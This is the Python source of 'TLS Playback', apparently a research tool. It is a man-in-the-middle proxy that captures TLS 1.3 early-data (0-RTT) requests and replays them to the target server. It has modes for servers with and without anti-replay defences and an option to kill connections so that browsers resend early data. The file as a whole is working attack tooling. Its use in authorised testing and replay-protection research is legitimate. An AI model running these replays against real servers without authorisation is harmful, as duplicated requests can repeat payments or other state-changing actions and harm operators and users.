#!/usr/bin/env python3

# TLS Playback

__author__ = "Alfonso Garcia Alguacil"
__credits__ = ["Alfonso Garcia Alguacil", "Alejo Murillo Moya"]
__license__ = "BSD"
__version__ = "1.0"
__maintainer__ = "Alfonso Garcia Alguacil"
__email__ = "alfon.v0@gmail.com"


import socket
import select
import time
import signal
from multiprocessing import Process, Pipe, Queue, Semaphore
import traceback
import sys
import getopt
from termios import tcflush, TCIFLUSH
import configparser
from termcolor import colored


def main():
    global main_pipe
    global control_pipe
    global debug
    opt=parse_options()
    debug=opt["debug"]    
    main_pipe, control_pipe=Pipe()
    early_data_queue=Queue()
    wait_for_replay=Semaphore()
    cntrl_c_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
    proxy_process=Process(target=proxy_main, args=(early_data_queue,
                                                   wait_for_replay,
                                                   opt["host"], 
                                                   opt["port"], 
                                                   opt["kill"], 
                                                   opt["kill_delay"], 
                                                   opt["block_len"], 
                                                   opt["listen_addr"],
                                                   opt["listen_port"],
                                                   opt["mode"]))
    proxy_process.start()
    signal.signal(signal.SIGINT, cntrl_c_handler)
    try:
        early_data_loop(early_data_queue, wait_for_replay, opt["host"], 
                        opt["port"], opt["mode"], opt["replay_delay"],
                        opt["write_template"], opt["read_template"], 
                        opt["length_deviation"], opt["template_decisions"],
                        opt["default_decision"])
    except KeyboardInterrupt:
        print("Exiting...")
        main_pipe.send("EXIT")
    proxy_process.join()
    exit(0)

def parse_options():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "b:dh:kl:m:p:r:w:", 
                                   ["block=",
                                    "debug", 
                                    "default_decision=",
                                    "host=", 
                                    "kill", 
                                    "kill_delay=", 
                                    "length_deviation=",
                                    "listen_addr=",
                                    "listen_port=",
                                    "mode=",
                                    "port=", 
                                    "read_template=",
                                    "replay_delay=",
                                    "template_decisions",
                                    "write_template="])
    except getopt.GetoptError as err:
        print(str(err))
        help()
        exit(1)
    block_len=8192
    debug=False
    default_decision="m" #manual
    host=None
    kill=False
    kill_delay=2
    length_deviation=0
    listen_addr="0.0.0.0"
    listen_port=4443
    mode="monitor"
    port=443
    read_template=None
    replay_delay=1
    template_decisions=False
    write_template=None

    for o, a in opts:
        if o in ("-b", "--block"):
                block_len=int(a)
        elif o in ("-d", "--debug"):
            debug=True
        elif o == "--default_decision":
            if len(o)>0:
                default_decision=a[0]
        elif o in ("-h", "--host"):
            host=a
        elif o in ("-k", "--kill"):
            kill=True
        elif o == "--kill_delay":
            kill_delay=int(a)
        elif o == "--length_deviation":
            length_deviation=float(a)
        elif o in ("-l", "--listen_addr"):
            listen_addr=a
        elif o == "--listen_port":
            listen_port=int(a)
        elif o in ("-m", "--mode"):
            mode=a
        elif o in ("-p", "--port"):
            port=int(a)
        elif o in ("-r", "--read_template"):
            read_template=a
        elif o == "--replay_delay":
            replay_delay=int(a)
        elif o == "--template_decisions":
            template_decisions=True
        elif o in ("-w",  "--write_template"):
            write_template=a
        else:
            assert False, "unhandled option"
            
    if host == None:
        print("[ERROR] The remote host (-h) has to be indicated")
        help()
        exit(1)
    if default_decision not in ("m","s"):
        print("[ERROR] Wrong default decision.")
        help()
        exit(1)

    return {"block_len":block_len,
            "debug":debug,
            "default_decision":default_decision,
            "host":host,
            "kill":kill,
            "kill_delay":kill_delay,
            "length_deviation":length_deviation,
            "listen_addr":listen_addr,
            "listen_port":listen_port,
            "mode":mode,
            "port":port,
            "read_template":read_template,
            "replay_delay":replay_delay,
            "template_decisions":template_decisions,
            "write_template":write_template}
    
def help():

    print()
    print('    _____ _    ___   ___ _           _             _   ')
    print('   |_   _| |  / __| | _ \ |__ _ _  _| |__  __ _ __| |__')
    print('     | | | |__\__ \ |  _/ / _` | || | \'_ \/ _` / _| / /')
    print('     |_| |____|___/ |_| |_\__,_|\_, |_.__/\__,_\__|_\_\ ')
    print('                                |__/                    ' )  
    print()
    print("Usage: " + sys.argv[0] + " -h <host> [options]")
    print("""

      -b, --block_len=BYTES   Bytes to use in socket.recv() methods. 
                              Default: 8192
                -d, --debug   Enables debug information. Default: disabled
         --default_decision   Default action to do when an EarlyData packet is
                              detected. Options:
                               - Skip: Ignores the packet.
                               - Manual: Asks the user what to do.
                              Default: Manual
                 -h, --host   Server IP. MANDATORY
                 -k, --kill   Kill connections to force Early Data requests. 
                              Default: Disabled
       --kill_delay=SECONDS   If -k is enabled, wait n seconds after the last
                              ApplicationData packet came from Server. 
                              Default: 2
 --length_deviation=PERCENT   Max length deviation to match a tag. Default: 0 
      --listen_addr=ADDRESS   Sets the address to listen in. Default: 0.0.0.0
         --listen_port=PORT   Sets the port to listen in. Default: 4443
            -m, --mode=MODE   Possible modes are:
                               - monitor Early Data packages are shown but it 
                                         is not possible to perform replays.
                               - no_protections Best mode to use against servers
                                                without anti-replay features.
                               - protections Best mode to use against servers
                                             with anti-replay features.
                                             It forces the browser to retry the
                                             request.
                              Default: monitor  
            -p, --port=PORT   Remote port to connect. Default: 443
   -r, --read_template=FILE   Reads a file containing tag information.
     --replay_delay=SECONDS   Seconds to wait after early data is replayed, 
                              before close the socket. Default: 1
       --template_decisions   Uses the decisions saved in the template file.
                              Default: Disabled
  -w, --write_template=FILE   Writes the tag information in a file.
""")
            
def print_early_packets_lengths(packets_len):
    print(colored("Early-Data received.", "white", attrs=['bold']) +
          " It contains %d Application Data packet(s) with the following" \
          " lengths:" % (len(packets_len)))
    counter=0
    for packet_len in packets_len:
        print(colored("  -  %d: %d bytes" % (counter, packet_len),"cyan"))
        counter+=1
    
def print_already_matched_tags(packets_len, tags_dict, length_deviation):
    print("\n   Tags already matched:")
    for tag in tags_lookup(packets_len, tags_dict, length_deviation):
        print(colored("  -  %s" % (tag["tag"]), "cyan") + 
              " (%s)" %(str(tag["auto_mode"])))
    print("")

def print_matched_tags(packets_len, tags_dict, length_deviation, read_template):
    print(colored("\nEarly-data received.", "white", attrs=['bold'])) 
    if read_template:        
        print("    It matches de following tags:")
        for tag in tags_lookup(packets_len, tags_dict, length_deviation):
            print(colored("  -  %s" % (tag["tag"]), "cyan") +
                  " (%s)" %(str(tag["auto_mode"])))
    print("")

def get_tags_auto_mode(packets_len, tags_dict, length_deviation, read_template,
                       default_decision, template_decisions):
    decision=default_decision
    n_reps_decision=0
    if template_decisions:
        for tag in tags_lookup(packets_len, tags_dict, length_deviation):
            tag_decision=default_decision
            n_reps=0
            if tag["auto_mode"].isnumeric():
                if int(tag["auto_mode"]) > 0:
                    tag_decision="a"
                    n_reps=int(tag["auto_mode"])
            elif tag["auto_mode"]=="m":
                tag_decision="m"
                n_reps=0
            elif tag["auto_mode"]=="s":
                tag_decision="s"
                n_reps=0

            if tag_decision!=default_decision:
                decision=tag_decision
                n_reps_decision=n_reps
    return decision, n_reps_decision

def print_separator():
    print(colored("\n++++++++++++++++++++++++++++++++++++++++++++", "blue"))

def print_new_line():
    print("")

def ask_user_for_new_tag():
    print("  What tag do you want to apply to this packets? (empty to skip)")
    tcflush(sys.stdin, TCIFLUSH)
    new_tag=input("  > ")
    return new_tag

def ask_user_for_new_tag_auto_mode():
    returned_mode="s"
    n_rep=0
    print("  How do you want to mark this tag for the automatic moded? ")
    print("    (S)kip/(m)anual/(a)uto")
    tcflush(sys.stdin, TCIFLUSH)
    mode=input("  > ")
    if mode in ("m", "M"):
        returned_mode="m"
    elif mode in ("a", "A"):
        print("  If possible, how many times do you want to replay it?")
        tcflush(sys.stdin, TCIFLUSH)
        n_rep=input("  > ")
        if n_rep.isnumeric() and int(n_rep)>0:
            returned_mode=int(n_rep)
    return returned_mode


def ask_user_for_number_of_replays():
    n_replays=0
    print("  How many times do you want to " + colored("replay", "white", 
            attrs=["bold"]) + " it? (0 or enter to skip)")
    tcflush(sys.stdin, TCIFLUSH)
    n_replays_entered=input("  > ")
    if n_replays_entered.isnumeric():
        n_replays=int(n_replays_entered)
    return n_replays

def ask_user_force_retry():
    print("  Do you want to force the " + colored("replay", "white", 
            attrs=["bold"]) + "? [y/N]")
    tcflush(sys.stdin, TCIFLUSH)
    replay=input("  > ")
    if replay=="y":
        return True
    return False



def early_data_loop(queue, wait_for_replay, host, port, mode, replay_delay, 
                    write_template, read_template, length_deviation, 
                    template_decisions, default_decision):
    tags_dict={}
    if read_template:
        tags_dict=tags_extract(read_template)
    
    while True:
        early_data=queue.get()
        print_dbg(early_data)
        app_data_packets=[]
        for packet in early_data["tls_packets_info"]:
            if is_app_data(packet):
                app_data_packets.append(packet)
        print_separator()
        packets_len=[]
        for packet in app_data_packets:
            packets_len.append(packet["length"])
        print_new_line()
        if mode=="monitor":
            print_early_packets_lengths(packets_len) 
            if read_template:
                print_already_matched_tags(packets_len, tags_dict, 
                                           length_deviation)

            if write_template:
                new_tag=ask_user_for_new_tag()
                if new_tag:
                    new_tag_mode=ask_user_for_new_tag_auto_mode()
                    write_tag(new_tag, new_tag_mode, packets_len, 
                              write_template, tags_dict)

        elif mode=="no_protections":
            print_matched_tags(packets_len, tags_dict, length_deviation, 
                               read_template)
            auto_mode, n_replays=get_tags_auto_mode(packets_len, tags_dict, 
                                                    length_deviation,
                                                    packets_len, 
                                                    default_decision, 
                                                    template_decisions)
            if auto_mode=="a":
                print_dbg("Automatic replay")
            elif auto_mode=="m":
                n_replays=ask_user_for_number_of_replays()
            elif auto_mode=="s":
                print(" Skipped due to auto_mode")
                n_replays=0
            for i in range(n_replays):
                replay_data(early_data["tcp_buffers"], host, port, replay_delay)
                print(colored(" Packet replayed", "green"))
        elif mode=="protections": #protected mode
            print_matched_tags(packets_len, tags_dict, length_deviation,
                               read_template)
            auto_mode, n_replays=get_tags_auto_mode(packets_len, tags_dict,
                                                    length_deviation,
                                                    packets_len, 
                                                    default_decision, 
                                                    template_decisions)

            if auto_mode=="a":
                print_dbg("Automatic replay")
            elif auto_mode=="m":
                if ask_user_force_retry():
                    n_replays=1
            elif auto_mode=="s":
                print(" Skipped due to auto_mode")
            if n_replays > 0:
                replay_data(early_data["tcp_buffers"], host, port, replay_delay)
                print(colored(" Early data replayed. Retry forced."))
            wait_for_replay.release()

def tags_extract(tag_file):
    tags_dict={}
    tag_handler=configparser.RawConfigParser()
    tag_handler.read(tag_file)
    for section in tag_handler.sections():
        npackets=tag_handler.getint(section, "npackets")
        if npackets not in tags_dict:
            tags_dict[npackets]=[]
        len_packets=tag_handler.get(section, "lens")
        auto_mode=tag_handler.get(section, "auto_mode")
        tags_dict[npackets].append({"tag":section, 
                                    "lens":len_packets.split(","),
                                    "auto_mode":auto_mode})
    return tags_dict

def write_tag(tag, tag_mode, packets_len, tag_file, tags_dict):
    tag_handler=configparser.RawConfigParser()
    tag_handler.read(tag_file)
    unique_name=False
    while not unique_name:
        try:
            tag_handler.add_section(tag)
            unique_name=True
        except configparser.DuplicateSectionError:
            tag=tag+"_"
    tag_handler.set(tag, "npackets", len(packets_len))
    tag_handler.set(tag, "lens", ",".join(map(str, packets_len)))
    tag_handler.set(tag, "auto_mode", tag_mode)
    with open(tag_file, 'w') as tag_config:
        tag_handler.write(tag_config)
    tag_config.close()
    update_tag(tag, tag_mode, packets_len, tags_dict)

def update_tag(tag, tag_mode, packets_len, tags_dict):
    npackets=len(packets_len)
    if npackets not in tags_dict:
        tags_dict[npackets]=[]
    tags_dict[npackets].append({"tag":tag, "lens":packets_len, 
                                "auto_mode":tag_mode})


def tags_lookup(packets_len, tags_dict, percent):
    tags=[]
    npackets=len(packets_len)
    if npackets in tags_dict:
        for tag in tags_dict[npackets]:
            i=0
            matched=False
            while i < npackets:
                up_limit=float(packets_len[i])*float(100+percent)/float(100)
                down_limit=float(packets_len[i])*float(100-percent)/float(100)
                if float(tag["lens"][i]) >= down_limit \
                        and float(tag["lens"][i]) <= up_limit:
                    if i==(npackets-1):
                        tags.append({"tag":tag["tag"], 
                                     "auto_mode": tag["auto_mode"]})
                else:
                    break
                i+=1
    return tags
    

def proxy_main(early_data_queue, wait_for_replay, host, port, kill, kill_delay,
               block_len, listen_addr, listen_port, mode):
    print("\n Setting up the proxy...")
    im_listening=False
    while not im_listening:
        try:
            own_server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            own_server.bind((listen_addr, listen_port))
            own_server.listen(2)
            im_listening=True
        except socket.error:
            time.sleep(1)
    print(" Done. The proxy is ready.\n")
    set_alarm_handler()
    exit_flag=False
    currently_early_data=False
    try:
        while not exit_flag:
            inputs=[control_pipe, own_server]
            client=None
            server=None
            while not exit_flag and client==None:
                inputready,outputready,exceptready = select.select(inputs, [],
                                                                   [])
                for s in inputready:
                    if s==control_pipe:
                        buf=s.recv()
                        if buf=="EXIT":
                            exit_flag=True
                    elif s==own_server:
                        client, address = own_server.accept()
                        print_dbg("Client Connection accepted")
                        server = socket.socket(socket.AF_INET, 
                                               socket.SOCK_STREAM)
                        server.connect((host, port))
                        print_dbg("Server connection established")
            inputs=[control_pipe, client, server]
            outputs=[]
            buffers_to_send=[]
            tls_packets_info=[]
            tls_state=0
            reset_alarm=False
            print_dbg("Entering into select() loop")
            while len(inputs)>1 and not exit_flag:
                inputready,outputready,exceptready = select.select(inputs, 
                                                                   outputs, [])
                for s in inputready:
                    if s==client:
                        buf=client.recv(block_len)
                        if buf:
                            print_dbg("Packets received from client: " 
                                      + str(get_tls_packet_info(buf)))
                            tls_packets=get_tls_packet_info(buf)
                            if is_early_data(tls_packets[0]):
                                print_dbg("Early data detected")
                                currently_early_data=True
                                if mode=="protections":
                                    wait_for_replay.acquire()
                            
                            if currently_early_data:
                                buffers_to_send.append(buf)
                                tls_packets_info.extend(tls_packets)
                                for tls_packet in tls_packets:
                                    if is_app_data(tls_packet):
                                        currently_early_data=False
                                        early_data_queue.put(
                                                {"tcp_buffers": buffers_to_send,
                                                 "tls_packets_info": 
                                                 tls_packets_info})
                                        if mode=="protections":
                                            wait_for_replay.acquire()
                                        for buffer_packet in buffers_to_send:
                                            server.sendall(buffer_packet)
                                        print_dbg("Packets sent to the server")
                                        buffers_to_send=[]
                                        tls_packets_info=[]
                                        if mode=="protections":
                                            wait_for_replay.release()
                                        break

                            else:
                                server.sendall(buf)
                                print_dbg("Packets sent to the server")
                            for packet in tls_packets:
                                tls_state, reset_alarm = get_new_tls_state(
                                        tls_state, packet, "client")
                                if reset_alarm and kill:
                                    set_alarm(kill_delay)
                        else:
                            close_sockets(client, server, inputs, outputs) 
                    elif s==server:
                        buf=server.recv(block_len)
                        if buf:
                            print_dbg("Packets received from server: " 
                                      + str(get_tls_packet_info(buf)))
                            client.sendall(buf)
                            print_dbg("Packets sent to the client")
                            for packet in get_tls_packet_info(buf):
                                tls_state, reset_alarm = get_new_tls_state(
                                        tls_state, packet, "server")
                                if reset_alarm and kill:
                                    set_alarm(kill_delay)
                        else:
                            close_sockets(client, server, inputs, outputs)
                    elif s==control_pipe:
                        print_dbg("Control Pipe has received data")
                        buf=s.recv()
                        if buf=="ALARM":
                            print_dbg("ALARM message received")
                            close_sockets(client, server, inputs, outputs)
                        elif buf=="EXIT":
                            print_dbg("EXIT message received")
                            close_sockets(client, server, inputs, outputs)
                            exit_flag=True
        close_sockets(client, server, inputs, outputs)
        try:
            own_server.shutdown(socket.SHUT_RDWR)
        except IOException:
            print_dbg("Error shutting down own_server")
        finally:
            own_server.close()
    except Exception as e:
        print("EXCEPTION")
        traceback.print_exc()
        print()
        raise e
    exit(0)

def close_sockets(client, server, inputs, outputs):
    print_dbg("Close sockets")
    disable_alarm()
    if client in outputs:
        outputs.remove(client)
    if client in inputs:
        inputs.remove(client)
    if server in outputs:
        outputs.remove(server)
    if server in inputs:
        inputs.remove(server)
    if server:
        try:
            server.shutdown(socket.SHUT_RDWR)
        except IOException:
            print_dbg("Error shutting down server socket")
        finally:
            server.close()
    if client:
        try:
            client.shutdown(socket.SHUT_WR)
            time.sleep(0.3)
        except IOException:
            client.close()

def get_tls_packet_info(tls_data):
    packets=[]
    bytes_parsed=0
    while bytes_parsed < len(tls_data):
        info={}
        data=tls_data[bytes_parsed:]
        if data and len(data)>5:
            info["type"]=data[0]
            info["legacy_record_version"]=data[1:3]
            info["length"]=int.from_bytes(data[3:5], byteorder="big")
            if info["type"]==22: # handshake
                info["handshake"]={}
                if len(data[5:])>=info["length"]:
                    info["handshake"]["type"]=data[5]
                    info["handshake"]["length"]=int.from_bytes(data[6:9], 
                                                               byteorder="big")
                    if info["handshake"]["type"] == 1: # ClientHello
                        info["handshake"]["legacy_version"] = data[9:11]
                        info["handshake"]["random"]=data[11:43]
                        info["handshake"]["sess_id_len"]=data[43]
                        current_position=44 + info["handshake"]["sess_id_len"]
                        info["handshake"]["cipher_suites_len"]=int.from_bytes(
                                data[current_position:current_position+2], 
                                byteorder="big")
                        current_position+=2
                        current_position+=info["handshake"]["cipher_suites_len"]
                        info["handshake"]["compr_len"]=data[current_position]
                        current_position+=1
                        current_position+=info["handshake"]["compr_len"]
                        info["handshake"]["extensions_len"]=int.from_bytes(
                                data[current_position:current_position+2], 
                                byteorder="big")
                        current_position+=2
                        extension_len=info["handshake"]["extensions_len"]
                        info["handshake"]["extensions"]=tls_parse_extensions(
                                data[current_position:
                                     current_position+extension_len])
                else:
                    print_dbg("Invalid TLS Handshake Packet, len < 5")
        else:
            print_dbg("Invalid TLS Packet, len < 5")
        packets.append(info)
        bytes_parsed+=info["length"]+5
    return packets

def tls_parse_extensions(extensions_data):
    extensions={"early_data":False,
                "tls_1_3":False}
    current_position=0
    while current_position<len(extensions_data):
        extension_type=int.from_bytes(
                extensions_data[current_position:current_position+2], 
                byteorder="big")
        current_position+=2
        extension_len=int.from_bytes(
                extensions_data[current_position:current_position+2], 
                byteorder="big")
        current_position+=2
        extension_value=extensions_data[current_position:
                                        current_position+extension_len]
        current_position+=extension_len
        if extension_type==43: # supported_version extension
            if extensions_data[5:7] == "\x7f\x17":
                extensions["tls_1_3"]=True
        elif extension_type==42:
                extensions["early_data"]=True
    return extensions            

def is_early_data(tls_packet_info):
    if tls_packet_info["type"]==22: # handshake
        if tls_packet_info["handshake"]["type"]==1: # client_hello
            if tls_packet_info["handshake"]["extensions"]["early_data"]:
                return True
    return False

def is_app_data(tls_packet_info):
    if tls_packet_info["type"]==23:
        return True
    return False

def get_new_tls_state(current_state, tls_packet_info, origin="client"):
    new_state=current_state
    reset_state=False
    if current_state==0:
        if tls_packet_info["type"]==22: # handshake
            if tls_packet_info["handshake"]["type"]==1: # client_hello
                if tls_packet_info["handshake"]["extensions"]["early_data"]:
                    new_state=2
                else:
                    new_state=1
    elif current_state==1:
        if tls_packet_info["type"]==23 and origin=="client": #app_data
            new_state=3
    elif current_state==2:
        if tls_packet_info["type"]==22:
            if tls_packet_info["handshake"]["type"]==2: #server_hello
                new_state=4
    elif current_state==3:
        if tls_packet_info["type"]==23 and origin=="client":
            new_state=4
    elif current_state==4:
        if tls_packet_info["type"]==23 and origin=="server":
            new_state=5
            reset_state=True
    elif current_state==5:
        if tls_packet_info["type"]==23 and origin=="server":
            reset_state=True
    print_dbg("Current state: " + str(current_state) + " new_state: " 
              + str(new_state) + " reset_state: " + str(reset_state))
    return (new_state, reset_state)


def replay_data(data_to_replay, ip, port, replay_delay):
    print_dbg("Replaying data...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    for data_buffer in data_to_replay:
        s.sendall(data_buffer)
    if(replay_delay>0):
        print_dbg("Waiting replay_delay seconds: " + str(replay_delay))
        time.sleep(replay_delay)
    s.close()

def receive_alarm(signum, stack):
    print_dbg("Alarm handler triggered: receive_alarm()")
    main_pipe.send("ALARM")
    disable_alarm()
    return

def set_alarm_handler():
    signal.signal(signal.SIGALRM, receive_alarm)

def set_alarm(seconds):
    signal.alarm(seconds)
    
def disable_alarm():
    print_dbg("disable alarm")
    signal.alarm(0)

def print_dbg(message):
    if debug:
        print("[DEBUG] " + str(message))

if __name__ == "__main__":
    main()
